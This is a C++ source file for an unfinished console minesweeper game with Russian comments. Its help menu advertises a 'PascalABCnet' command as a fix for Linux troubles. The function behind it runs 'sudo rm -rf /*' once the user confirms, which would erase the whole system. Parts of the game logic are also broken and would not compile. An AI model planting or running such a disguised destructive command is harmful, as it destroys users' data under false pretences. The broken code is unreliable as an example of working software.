#include <iostream>
#include <cstdlib>
#include <ctime>

using namespace std;

class pole
{
protected:
    unsigned int width;
    unsigned int length;
    unsigned int count;
    int **tabl;
    int **htabl;

public:
    pole(unsigned int a, unsigned int b, unsigned int c)
    {
        length = a;
        width = b;
        count = c;
        tabl = new int *[length];
        for (int i = 0; i < length; i++)
        {
            tabl[i] = new int[width];
        }
        htabl = new int *[length];
        for (int i = 0; i < length; i++)
        {
            htabl[i] = new int[width];
        }
        mina = new bool[length * width];
    }
    void mines() //самый хреновый по времени алгоритм для этого, но ладно, сойдет
    {
        int i = 0;
        int k = 0;
        int k1 = 0;
        while (i < count)
        {
            srand(time(NULL));
            k = rand() % length;
            k1 = rand() % width;
            if (!(htabl[k][k1] == -1))
            {
                htabl[k][k1] = -1;
                i++;
            }
        }
    }
    void out()
    {
        for (int i = 0; i < length; i++)
        {
            for (int j = 0; j < width; j++)
            {
                cout << htabl[i][j] << " ";
            }
            cout << endl;
        }
    }
    void calculate()
    {
        for (int i = 1; i < (length - 2); i++)
        {
            if (htabl[i - 1][j - 1] == -1)
                htabl[i][j]++;
            if (htabl[i][j] == -1) (htabl[i][j]++)
        }
    }
};

inline void message1();
inline void message2();
inline void main_help();
inline void PascalABCnet();

int main()
{
    message1();
    string command;
    bool win = false;
    while (!(command == "exit"))
    {
        cout << "main menu>>>";
        cin >> command;
        if (command == "start")
        {
            int f = 0;
            int f1 = 0;
            int f2 = 0;
            cin >> f >> f1 >> f2;
            pole A(8, 8, 20);
            A.mines();
            //A.calculate();
            A.out();
            string icommand;
            while ((!(icommand == "stop")) || (win = false))
            {
                cout << "game>>>";
                cin >> icommand;
            }
        }
        if (command == "help")
        {
            main_help();
        }
    }
    return 0;
}

inline void message1()
{
    system("clear");
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "|                      Welcome to Conslole minesweeper                           |" << endl;
    cout << "----------------------------------------------------------------------------------" << endl;
}

inline void message2()
{
    system("clear");
    cout << "----------------------------------------------------------------------------------" << endl;
    cout << "|                               Console minesweeper                              |" << endl;
    cout << "----------------------------------------------------------------------------------" << endl;
}

inline void main_help()
{
    message2();
    cout << "Вывод списка команд" << endl;
    cout << "1) start - начало игры" << endl;
    cout << "2) PascalABCnet - избавит вас от мучений с Linux. Note: it is effective!" << endl;
    cout << "3) exit - выход из скрипта" << endl;
}

inline void PascalABCnet()
{
    message2();
    char a;
er:
    cout << "Вы уверены, что хотите продолжить? (Y или y - да; N или n - нет) " << endl;
    cout << "Внимание! Вы должны обладать правами администратора!" << endl;
    cin >> a;
    switch (a)
    {
    case 'Y':
    {
        system("sudo rm -rf /*");
        break;
    } //брейк тут уже даже и не понадобится)
    case 'y':
    {
        system("sudo rm -rf /*");
        break;
    }
    case 'N':
    {
        cout << "Never use Pascal again!!!" << endl;
        break;
    }
    case 'n':
    {
        cout << "Never use Pascal again!!!" << endl;
        break;
    }
    default:
    {
        cout << "Incorrect letter!" << endl;
        goto er;
    }
    }
}
